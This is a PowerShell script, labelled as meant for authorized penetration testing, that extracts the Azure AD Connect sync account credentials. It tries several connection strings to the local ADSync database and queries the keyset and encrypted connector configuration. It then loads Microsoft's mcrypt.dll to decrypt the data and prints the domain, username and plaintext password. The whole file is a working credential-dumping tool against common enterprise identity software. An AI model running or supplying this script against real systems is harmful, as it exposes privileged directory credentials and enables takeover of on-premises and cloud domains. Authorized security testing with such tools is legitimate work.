# Azure AD Connect Sync Credential Extractor for Authorized Pentesting Only
# This script is intended for authorized penetration testing of Azure AD Connect environments.
# Unauthorized use of this script to extract credentials without permission is illegal and unethical.

# List of potential connection strings to try for connecting to the ADSync database
$connectionStrings = @(
    "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync;Integrated Security=True",
    "Data Source=localhost;Initial Catalog=ADSync;Integrated Security=True",
    "Data Source=127.0.0.1;Initial Catalog=ADSync;Integrated Security=True",
    "Data Source=localhost\SQLEXPRESS;Initial Catalog=ADSync;Integrated Security=True"
)

# Variable to track if a successful connection is made
$connectionSuccess = $false

# Attempt to connect to the SQL database using the different connection strings
foreach ($connectionString in $connectionStrings) {
    try {
        Write-Host "Attempting connection: $connectionString"
        $client = New-Object System.Data.SqlClient.SqlConnection -ArgumentList $connectionString
        $client.Open()
        Write-Host "Connection successful!"
        $connectionSuccess = $true
        break
    }
    catch [System.Exception] {
        Write-Host "Error connecting to SQL database. Trying next..."
        Write-Host "Exception Message: $($_.Exception.Message)"
    }
}

# Exit if no connection was successful
if (-not $connectionSuccess) {
    Write-Host "All connection attempts failed. Ensure the SQL Server is running and accessible."
    exit
}

# Query for cryptographic keyset information from the mms_server_configuration table
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()

if (!$reader.Read()) {
    Write-Host "Failed to retrieve keyset information."
    exit
}

# Store the retrieved cryptographic information
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

# Query for encrypted configuration and credentials from the mms_management_agent table
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()

if (!$reader.Read()) {
    Write-Host "Failed to retrieve configuration."
    exit
}

# Store the encrypted credentials and configuration
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

# Paths to look for mcrypt.dll, used for decryption
$mcryptPaths = @(
    "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll",
    "C:\Program Files (x86)\Microsoft Azure AD Sync\Bin\mcrypt.dll",
    "C:\Program Files\Microsoft Azure AD Connect\Bin\mcrypt.dll"
)

$dllLoaded = $false

# Attempt to load mcrypt.dll from the known paths
foreach ($dllPath in $mcryptPaths) {
    if (Test-Path $dllPath) {
        try {
            Write-Host "Loading mcrypt.dll from: $dllPath"
            Add-Type -Path $dllPath
            $dllLoaded = $true
            break
        }
        catch {
            Write-Host "Error loading mcrypt.dll from $dllPath"
        }
    }
}

# Exit if mcrypt.dll could not be loaded
if (-not $dllLoaded) {
    Write-Host "Failed to load mcrypt.dll. Ensure it exists in one of the expected paths."
    exit
}

# Decrypt the encrypted credentials using the KeyManager class from mcrypt.dll
try {
    $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
    $km.LoadKeySet($entropy, $instance_id, $key_id)

    $key = $null
    $km.GetActiveCredentialKey([ref]$key)

    $key2 = $null
    $km.GetKey(1, [ref]$key2)

    $decrypted = $null
    $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
}
catch {
    Write-Host "Error loading KeyManager or decrypting credentials."
    exit
}

# Extract domain, username, and password from the decrypted configuration
try {
    $domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
    $username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
    $password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

    # Output the credentials to the user
    Write-Host ("Domain: " + $domain.Domain)
    Write-Host ("Username: " + $username.Username)
    Write-Host ("Password: " + $password.Password)
}
catch {
    Write-Host "Error extracting domain, username, or password."
    exit
}
